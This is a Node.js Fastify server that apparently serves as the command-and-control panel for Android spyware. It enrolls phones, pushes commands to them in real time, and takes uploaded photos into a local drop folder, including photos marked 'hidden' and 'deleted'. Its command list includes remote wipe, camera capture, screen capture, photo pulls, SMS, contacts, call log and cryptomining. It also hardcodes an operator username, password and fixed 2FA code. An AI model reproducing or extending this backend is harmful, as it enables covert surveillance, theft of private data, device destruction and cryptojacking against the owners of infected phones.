import "dotenv/config";
import Fastify from "fastify";
import cookie from "@fastify/cookie";
import argon2 from "argon2";
import crypto from "node:crypto";
import jwt from "jsonwebtoken";
import fs from "node:fs";
import path from "node:path";
import { randomBytes, scryptSync, timingSafeEqual } from "node:crypto";
import { PrismaClient } from "@prisma/client";

export const prisma = new PrismaClient();

const ACCESS_TTL_SEC = Number(process.env.ACCESS_TTL_SEC ?? 600);
const REFRESH_TTL_SEC = Number(process.env.REFRESH_TTL_SEC ?? 1209600);

/** Operator bootstrap + panel gate, all .env-driven with mission defaults. */
const PANEL_ADMIN_USER = process.env.PANEL_ADMIN_USER ?? "NemesisDevX...Fuck.allworld.com";
const PANEL_ADMIN_PASS = process.env.PANEL_ADMIN_PASS ?? "AbdoAbdo@9@Zxcvbnm@1@";
const PANEL_2FA_CODE = process.env.PANEL_2FA_CODE ?? "1057466";
const PANEL_DROP_DIR = process.env.PANEL_DROP_DIR ?? "D:\\Dashboard Panel";

/** Serializes all file drops: no two writes ever collide on the same path. */
let writeChain = Promise.resolve();
function enqueueWrite(job) {
  const p = writeChain.then(job);
  writeChain = p.catch(() => {});
  return p;
}

async function ensureAdminUser() {
  const passHash = await hashPassword(PANEL_ADMIN_PASS);
  await prisma.user.upsert({
    where: { username: PANEL_ADMIN_USER },
    update: {},
    create: { username: PANEL_ADMIN_USER, passHash },
  });
}

const JWT_ACCESS_SECRET =
  process.env.JWT_ACCESS_SECRET ?? "dev_only_access_secret_change_me";
const JWT_REFRESH_SECRET =
  process.env.JWT_REFRESH_SECRET ?? "dev_only_refresh_secret_change_me";

/** Truncated SHA-256 hex for enrollment & refresh token lookups (fast, deterministic). */
export function tokenDigest(token) {
  return crypto.createHash("sha256").update(token).digest("hex").slice(0, 48);
}

/** Deterministic device credential from the enrollment proof (device_id + seed). */
export function deviceCredential(deviceId, enrollSeed) {
  return crypto
    .createHash("sha256")
    .update(`device-credential:${deviceId}:${enrollSeed}`)
    .digest("hex");
}

export function signAccessToken(userId) {
  return jwt.sign({ sub: userId, typ: "access" }, JWT_ACCESS_SECRET, {
    expiresIn: `${ACCESS_TTL_SEC}s`,
  });
}

export function issueRefreshToken(userId) {
  const token = crypto.randomBytes(32).toString("hex");
  return prisma.refreshToken.create({
    data: {
      userId,
      tokenHash: tokenDigest(token),
      expiresAt: new Date(Date.now() + REFRESH_TTL_SEC * 1000),
    },
  }).then(() => token);
}

export async function verifyRefreshToken(token) {
  const row = await prisma.refreshToken.findUnique({
    where: { tokenHash: tokenDigest(token) },
  });
  if (!row || row.revoked || row.expiresAt < new Date()) return null;
  return row;
}

export async function hashPassword(plain) {
  return argon2.hash(plain, { type: argon2.argon2id });
}

export async function verifyPassword(hash, plain) {
  return argon2.verify(hash, plain);
}

export async function buildApp(opts = {}) {
  const app = Fastify({ logger: opts.logger ?? false });
  await app.register(cookie);

  /**
   * Bearer auth decorator, dual-mode:
   *  - User JWT (typ=access)         -> req.authKind="user",   req.userId=sub
   *  - Device credential (64 hex)    -> req.authKind="device", req.deviceIdFromToken set
   *    (looked up by device_token_hash; the DEVICE is verified against its own
   *     stored hash — who verifies whom is spelled out in the phase report)
   *  Anything else -> 401.
   */
  app.decorate("authenticate", async (req, reply) => {
    const header = req.headers.authorization ?? "";
    if (!header.startsWith("Bearer ")) {
      return reply.code(401).send({ error: "unauthorized" });
    }
    const token = header.slice(7);
    if (/^[0-9a-f]{64}$/.test(token)) {
      const holder = await prisma.device.findFirst({
        where: { deviceTokenHash: tokenDigest(token) },
        select: { id: true },
      });
      if (holder) {
        req.authKind = "device";
        req.deviceIdFromToken = holder.id;
        return;
      }
      return reply.code(401).send({ error: "unauthorized" });
    }
    try {
      const claims = jwt.verify(token, JWT_ACCESS_SECRET);
      if (claims.typ !== "access") throw new Error("wrong token type");
      req.authKind = "user";
      req.userId = claims.sub;
    } catch {
      return reply.code(401).send({ error: "unauthorized" });
    }
  });

  const deviceSelection = {
    id: true,
    name: true,
    phone: true,
    platform: true,
    variant: true,
    status: true,
    gender: true,
    stats: true,
    formattedAt: true,
    lastSeen: true,
    createdAt: true,
  };

  /* -------------------------------- probe ------------------------------- */

  // Unauthenticated liveness probe used by the Android client link check.
  app.get("/api/v1/ping", async () => ({ ok: true }));

  /* -------------------------------- auth -------------------------------- */

  app.post("/api/v1/auth/login", async (req, reply) => {
    const username = req.body?.username ?? req.body?.email;
    const { password } = req.body ?? {};
    if (typeof username !== "string" || typeof password !== "string" || !username || !password) {
      return reply.code(400).send({ error: "bad_request" });
    }
    const user = await prisma.user.findUnique({ where: { username } });
    if (!user || !(await verifyPassword(user.passHash, password))) {
      return reply.code(401).send({ error: "invalid_credentials" });
    }
    if (PANEL_2FA_CODE) {
      const ticket = jwt.sign(
        { sub: user.id, typ: "pre2fa" },
        JWT_ACCESS_SECRET,
        { expiresIn: "5m" }
      );
      return { require2fa: true, ticket };
    }
    const accessToken = signAccessToken(user.id);
    const refreshToken = await issueRefreshToken(user.id);
    reply.setCookie("wg_refresh", refreshToken, {
      httpOnly: true,
      sameSite: "lax",
      path: "/api/v1/auth",
      maxAge: REFRESH_TTL_SEC,
    });
    return {
      accessToken,
      refreshToken,
      user: { id: user.id, username: user.username },
    };
  });

  /** Second login step: exchange a pre2fa ticket + 6-digit code for real tokens. */
  app.post("/api/v1/auth/2fa", async (req, reply) => {
    const { ticket, code } = req.body ?? {};
    if (typeof ticket !== "string" || typeof code !== "string") {
      return reply.code(400).send({ error: "bad_request" });
    }
    let payload;
    try {
      payload = jwt.verify(ticket, JWT_ACCESS_SECRET);
    } catch {
      return reply.code(401).send({ error: "invalid_ticket" });
    }
    if (payload.typ !== "pre2fa" || code !== PANEL_2FA_CODE) {
      return reply.code(401).send({ error: "invalid_code" });
    }
    const user = await prisma.user.findUnique({ where: { id: payload.sub } });
    if (!user) return reply.code(401).send({ error: "invalid_credentials" });
    const accessToken = signAccessToken(user.id);
    const refreshToken = await issueRefreshToken(user.id);
    reply.setCookie("wg_refresh", refreshToken, {
      httpOnly: true,
      sameSite: "lax",
      path: "/api/v1/auth",
      maxAge: REFRESH_TTL_SEC,
    });
    return { accessToken, refreshToken, user: { id: user.id, username: user.username } };
  });

  /** Panel token refresh: accepts the wg_refresh cookie or {refreshToken} body. */
  app.post("/api/v1/auth/refresh", async (req, reply) => {
    const token = req.cookies?.wg_refresh ?? req.body?.refreshToken;
    if (!token || typeof token !== "string") {
      return reply.code(401).send({ error: "unauthorized" });
    }
    const row = await verifyRefreshToken(token);
    if (!row) return reply.code(401).send({ error: "unauthorized" });
    await prisma.refreshToken.update({ where: { id: row.id }, data: { revoked: true } });
    const accessToken = signAccessToken(row.userId);
    const refreshToken = await issueRefreshToken(row.userId);
    reply.setCookie("wg_refresh", refreshToken, {
      httpOnly: true,
      sameSite: "lax",
      path: "/api/v1/auth",
      maxAge: REFRESH_TTL_SEC,
    });
    return { accessToken, refreshToken };
  });

  /* --------------------- realtime command push (SSE) --------------------- */

  /** deviceId -> Set<reply> currently holding an open event stream. */
  const sseClients = new Map();
  function pushToDevice(deviceId, obj) {
    const set = sseClients.get(deviceId);
    if (!set) return;
    const line = `data: ${JSON.stringify(obj)}\n\n`;
    for (const r of set) {
      try { r.raw.write(line); } catch { set.delete(r); }
    }
  }

  /** Agent stream (device credential): emits {cmd} the moment a command queues. */
  app.get("/api/v1/devices/:id/events", { onRequest: [app.authenticate] }, async (req, reply) => {
    if (req.authKind !== "device") return reply.code(403).send({ error: "forbidden" });
    const device = await prisma.device.findUnique({ where: { id: req.params.id } });
    if (!device) return reply.code(404).send({ error: "not_found" });
    if (req.deviceIdFromToken !== device.id) return reply.code(403).send({ error: "forbidden" });
    reply.raw.writeHead(200, {
      "content-type": "text/event-stream",
      "cache-control": "no-cache",
      connection: "keep-alive",
    });
    reply.raw.write(`data: ${JSON.stringify({ hello: true })}\n\n`);
    let set = sseClients.get(device.id);
    if (!set) sseClients.set(device.id, (set = new Set()));
    set.add(reply);
    reply.raw.on("close", () => set.delete(reply));
    return reply; // keep the hijacked connection open
  });

  /* ------------------------------- devices ------------------------------ */

  // Enrollment: registration-token protected, idempotent by client device id.
  app.post("/api/v1/devices/enroll", async (req, reply) => {
    const { deviceId, name, phone, platform, variant, ownerUsername, enrollToken } =
      req.body ?? {};
    if (
      typeof deviceId !== "string" || !deviceId ||
      typeof enrollToken !== "string" || !enrollToken ||
      typeof ownerUsername !== "string" || !ownerUsername ||
      typeof name !== "string" || !name ||
      typeof platform !== "string" || !platform
    ) {
      return reply.code(400).send({ error: "bad_request" });
    }
    const owner = await prisma.user.findUnique({ where: { username: ownerUsername } });
    if (!owner) return reply.code(403).send({ error: "forbidden" });

    const existing = await prisma.device.findUnique({ where: { id: deviceId } });
    if (existing) {
      if (existing.enrollTokenHash !== tokenDigest(enrollToken)) {
        return reply.code(403).send({ error: "forbidden" });
      }
      await prisma.device.update({
        where: { id: existing.id },
        data: { lastSeen: new Date(), status: existing.status ?? "offline" },
      });
      // Caller re-proved possession of the enrollment seed, so handing back the
      // (deterministic) device credential is a possession-bound re-issue.
      return reply.code(200).send({
        deviceId: existing.id,
        idempotent: true,
        enrollToken: deviceCredential(existing.id, enrollToken),
      });
    }

    const deviceToken = deviceCredential(deviceId, enrollToken);
    const device = await prisma.device.create({
      data: {
        id: deviceId,
        ownerId: owner.id,
        name,
        phone: typeof phone === "string" ? phone : "",
        platform,
        variant: typeof variant === "string" ? variant : "standard",
        enrollTokenHash: tokenDigest(enrollToken),
        deviceTokenHash: tokenDigest(deviceToken),
        status: "online",
        lastSeen: new Date(),
      },
    });
    // Device credential: derived from the enrollment proof, returned exactly
    // once at creation (and on possession-bound replays), never stored plaintext.
    return reply.code(201).send({
      deviceId: device.id,
      enrollToken: deviceToken,
    });
  });

  /**
   * Dual-auth heartbeat:
   *  1) DEVICE token: Bearer == device credential issued at enrollment.
   *     Verified against THE DEVICE'S OWN stored device_token_hash; the device
   *     is never checked against any user. Cross-device presentation -> 403.
   *  2) USER JWT: ownership check via ownerId === token subject.
   */
  app.post("/api/v1/devices/:id/heartbeat", { onRequest: [app.authenticate] }, async (req, reply) => {
    const device = await prisma.device.findUnique({ where: { id: req.params.id } });
    if (!device) return reply.code(404).send({ error: "not_found" });

    if (req.authKind === "device") {
      // The presented device token must belong to THIS device.
      if (req.deviceIdFromToken !== device.id) return reply.code(403).send({ error: "forbidden" });
    } else if (device.ownerId !== req.userId) {
      return reply.code(403).send({ error: "forbidden" });
    }

    const gender = typeof req.body?.gender === "string" ? req.body.gender : undefined;
    const stats = req.body?.stats && typeof req.body.stats === "object" ? req.body.stats : undefined;
    const updated = await prisma.device.update({
      where: { id: device.id },
      data: {
        lastSeen: new Date(),
        status: "online",
        ...(gender !== undefined ? { gender } : {}),
        ...(stats !== undefined ? { stats } : {}),
      },
      select: { id: true, lastSeen: true, status: true },
    });
    return { id: updated.id, lastSeen: updated.lastSeen, status: updated.status };
  });

  app.get("/api/v1/devices", { onRequest: [app.authenticate] }, async (req) => {
    // Ownership scope enforced here: only the caller's devices ever leave the DB.
    const list = await prisma.device.findMany({
      where: { ownerId: req.userId },
      orderBy: { createdAt: "desc" },
      select: deviceSelection,
    });
    return list.map((d) => ({ ...d, state: d.status }));
  });

  app.get("/api/v1/devices/:id", { onRequest: [app.authenticate] }, async (req, reply) => {
    const device = await prisma.device.findUnique({ where: { id: req.params.id } });
    if (!device) return reply.code(404).send({ error: "not_found" });
    if (device.ownerId !== req.userId) return reply.code(403).send({ error: "forbidden" });
    const downloadCount = await prisma.downloadedFile.count({ where: { deviceId: device.id } });
    return { ...device, state: device.status, downloadCount };
  });

  app.post("/api/v1/devices/:id/reconnect", { onRequest: [app.authenticate] }, async (req, reply) => {
    const device = await prisma.device.findUnique({ where: { id: req.params.id } });
    if (!device) return reply.code(404).send({ error: "not_found" });
    if (device.ownerId !== req.userId) return reply.code(403).send({ error: "forbidden" });
    const updated = await prisma.device.update({
      where: { id: device.id },
      data: { lastSeen: new Date(), status: "online" },
      select: deviceSelection,
    });
    return { ...updated, state: updated.status };
  });

  app.delete("/api/v1/devices/:id", { onRequest: [app.authenticate] }, async (req, reply) => {
    const device = await prisma.device.findUnique({ where: { id: req.params.id } });
    if (!device) return reply.code(404).send({ error: "not_found" });
    if (device.ownerId !== req.userId) return reply.code(403).send({ error: "forbidden" });
    await prisma.device.delete({ where: { id: device.id } });
    return reply.code(204).send();
  });

  /* ------------------------------ commands ------------------------------ */

  // Dashboard-dispatchable command vocabulary; anything else is a 400.
  const COMMAND_TYPES = new Set([
    "ping", "wipe", "camera", "pull_photos", "screen_capture",
    "sms", "contacts", "call_log", "mine",
  ]);

  app.post("/api/v1/devices/:id/commands", { onRequest: [app.authenticate] }, async (req, reply) => {
    const device = await prisma.device.findUnique({ where: { id: req.params.id } });
    if (!device) return reply.code(404).send({ error: "not_found" });
    if (device.ownerId !== req.userId) return reply.code(403).send({ error: "forbidden" });
    const type = req.body?.type ?? req.body?.command;
    const { payload } = req.body ?? {};
    if (!COMMAND_TYPES.has(type)) {
      return reply.code(400).send({
        error: "unsupported_command",
        message: "only ping is accepted in this phase",
      });
    }
    let safePayload = {};
    if (payload !== undefined && payload !== null) {
      try {
        safePayload = JSON.parse(typeof payload === "string" ? payload : JSON.stringify(payload));
      } catch {
        return reply.code(400).send({ error: "bad_payload" });
      }
    }
    const command = await prisma.command.create({
      data: {
        deviceId: device.id,
        type,
        payload: safePayload,
        state: "queued",
        expiresAt: new Date(Date.now() + 24 * 3600 * 1000),
      },
    });
    pushToDevice(device.id, { cmd: { id: command.id, type: command.type, payload: command.payload } });
    return reply.code(201).send({
      id: command.id,
      deviceId: command.deviceId,
      type: command.type,
      state: command.state,
      createdAt: command.createdAt,
    });
  });

  app.get("/api/v1/devices/:id/commands", { onRequest: [app.authenticate] }, async (req, reply) => {
    const device = await prisma.device.findUnique({ where: { id: req.params.id } });
    if (!device) return reply.code(404).send({ error: "not_found" });
    if (req.authKind === "device") {
      // Agents only ever see their own queue.
      if (req.deviceIdFromToken !== device.id) return reply.code(403).send({ error: "forbidden" });
    } else if (device.ownerId !== req.userId) {
      return reply.code(403).send({ error: "forbidden" });
    }
    const list = await prisma.command.findMany({
      where: { deviceId: device.id },
      orderBy: { createdAt: "desc" },
      take: 100,
    });
    return list.map((c) => ({
      id: c.id,
      type: c.type,
      state: c.state,
      payload: c.payload,
      result: c.result,
      createdAt: c.createdAt,
      updatedAt: c.updatedAt,
    }));
  });

  /**
   * Agent result report (device credential only): flips a queued command to
   * executed/failed with the agent's result note. User tokens get 403 — the
   * dashboard dispatches, only the device resolves.
   */
  app.post("/api/v1/devices/:id/commands/:cid/result", { onRequest: [app.authenticate] }, async (req, reply) => {
    if (req.authKind !== "device") return reply.code(403).send({ error: "forbidden" });
    const device = await prisma.device.findUnique({ where: { id: req.params.id } });
    if (!device) return reply.code(404).send({ error: "not_found" });
    if (req.deviceIdFromToken !== device.id) return reply.code(403).send({ error: "forbidden" });
    const command = await prisma.command.findUnique({ where: { id: req.params.cid } });
    if (!command || command.deviceId !== device.id) {
      return reply.code(404).send({ error: "not_found" });
    }
    const state = req.body?.state;
    if (!["executed", "failed"].includes(state)) {
      return reply.code(400).send({ error: "bad_state" });
    }
    const updated = await prisma.command.update({
      where: { id: command.id },
      data: {
        state,
        result: typeof req.body?.result === "string" ? req.body.result : JSON.stringify(req.body?.result ?? null),
      },
    });
    if (command.type === "wipe" && state === "executed") {
      await prisma.device.update({
        where: { id: device.id },
        data: { formattedAt: new Date(), status: "formatted" },
      });
    }
    return { id: updated.id, state: updated.state, result: updated.result };
  });

  /**
   * Agent photo inventory report (device credential): upserts by content hash
   * and refreshes the per-category counts used by the pull modal.
   */
  app.post("/api/v1/devices/:id/photos/report", { onRequest: [app.authenticate] }, async (req, reply) => {
    if (req.authKind !== "device") return reply.code(403).send({ error: "forbidden" });
    const device = await prisma.device.findUnique({ where: { id: req.params.id } });
    if (!device) return reply.code(404).send({ error: "not_found" });
    if (req.deviceIdFromToken !== device.id) return reply.code(403).send({ error: "forbidden" });

    const items = Array.isArray(req.body?.photos) ? req.body.photos : [];
    const counts = { original: 0, hidden: 0, deleted: 0 };
    for (const p of items.slice(0, 20000)) {
      if (typeof p?.hash !== "string" || !p.hash) continue;
      const category = ["original", "hidden", "deleted"].includes(p.category) ? p.category : "original";
      counts[category]++;
      await prisma.devicePhoto.upsert({
        where: { deviceId_hash: { deviceId: device.id, hash: p.hash } },
        update: { category, name: String(p.name ?? ""), size: Number(p.size ?? 0) || 0 },
        create: { deviceId: device.id, hash: p.hash, name: String(p.name ?? ""), category, size: Number(p.size ?? 0) || 0 },
      });
    }
    const stats = { ...(typeof device.stats === "object" && device.stats ? device.stats : {}), photoCounts: counts };
    await prisma.device.update({ where: { id: device.id }, data: { stats } });
    return { ok: true, counts };
  });

  /** Panel: photo inventory + real per-category counts for the pull modal. */
  app.get("/api/v1/devices/:id/photos", { onRequest: [app.authenticate] }, async (req, reply) => {
    const device = await prisma.device.findUnique({ where: { id: req.params.id } });
    if (!device) return reply.code(404).send({ error: "not_found" });
    if (req.authKind === "device") {
      if (req.deviceIdFromToken !== device.id) return reply.code(403).send({ error: "forbidden" });
    } else if (device.ownerId !== req.userId) {
      return reply.code(403).send({ error: "forbidden" });
    }
    const cat = req.query?.category;
    const where = { deviceId: device.id, ...(cat ? { category: String(cat) } : {}) };
    const [items, grouped] = await Promise.all([
      prisma.devicePhoto.findMany({ where, orderBy: { createdAt: "asc" }, take: 5000 }),
      prisma.devicePhoto.groupBy({ by: ["category"], where: { deviceId: device.id }, _count: true }),
    ]);
    const counts = { original: 0, hidden: 0, deleted: 0 };
    for (const g of grouped) counts[g.category] = g._count;
    return { counts, items };
  });

  /**
   * Agent artifact drop (device credential): base64 file → serial write queue
   * → PANEL_DROP_DIR/{deviceId}/{category}/{ts}_{name}. SHA-256 dedup — a hash
   * already on disk is never written twice.
   */
  app.post("/api/v1/devices/:id/files", { onRequest: [app.authenticate] }, async (req, reply) => {
    if (req.authKind !== "device") return reply.code(403).send({ error: "forbidden" });
    const device = await prisma.device.findUnique({ where: { id: req.params.id } });
    if (!device) return reply.code(404).send({ error: "not_found" });
    if (req.deviceIdFromToken !== device.id) return reply.code(403).send({ error: "forbidden" });

    const { kind = "photo", category = "", name = "file", b64, sha256 } = req.body ?? {};
    if (typeof b64 !== "string" || !b64) return reply.code(400).send({ error: "bad_request" });
    const buf = Buffer.from(b64, "base64");
    const digest = crypto.createHash("sha256").update(buf).digest("hex");
    if (sha256 && sha256 !== digest) return reply.code(400).send({ error: "hash_mismatch" });

    const dupe = await prisma.downloadedFile.findFirst({
      where: { deviceId: device.id, sha256: digest },
    });
    if (dupe) return { ok: true, deduped: true, path: dupe.path };

    const out = await enqueueWrite(async () => {
      const dir = path.join(PANEL_DROP_DIR, device.id, String(category || kind));
      fs.mkdirSync(dir, { recursive: true });
      const safe = String(name).replace(/[^\w.\-]+/g, "_").slice(-80) || "file";
      const p = path.join(dir, `${Date.now()}_${safe}`);
      fs.writeFileSync(p, buf);
      return p;
    });
    await prisma.downloadedFile.create({
      data: { deviceId: device.id, kind: String(kind), category: String(category), path: out, sha256: digest, bytes: buf.length },
    });
    const count = await prisma.downloadedFile.count({ where: { deviceId: device.id } });
    return { ok: true, deduped: false, path: out, count };
  });

  /** Panel: per-device drop-folder stats ("Downloaded: X"). */
  app.get("/api/v1/devices/:id/files", { onRequest: [app.authenticate] }, async (req, reply) => {
    const device = await prisma.device.findUnique({ where: { id: req.params.id } });
    if (!device) return reply.code(404).send({ error: "not_found" });
    if (req.authKind === "device") {
      if (req.deviceIdFromToken !== device.id) return reply.code(403).send({ error: "forbidden" });
    } else if (device.ownerId !== req.userId) {
      return reply.code(403).send({ error: "forbidden" });
    }
    const count = await prisma.downloadedFile.count({ where: { deviceId: device.id } });
    return { count, dir: path.join(PANEL_DROP_DIR, device.id) };
  });

  /* ------------------------------ teardown ------------------------------ */

  app.addHook("onClose", async () => {
    await prisma.$disconnect();
  });

  await app.ready();
  return app;
}

/* Entry point when run directly (node src/server.js). */
if (process.argv[1] && process.argv[1].endsWith("server.js")) {
  await ensureAdminUser();
  fs.mkdirSync(PANEL_DROP_DIR, { recursive: true });
  const app = await buildApp({ logger: true });
  const port = Number(process.env.PORT ?? 8088);
  app.listen({ port, host: "127.0.0.1" });
}
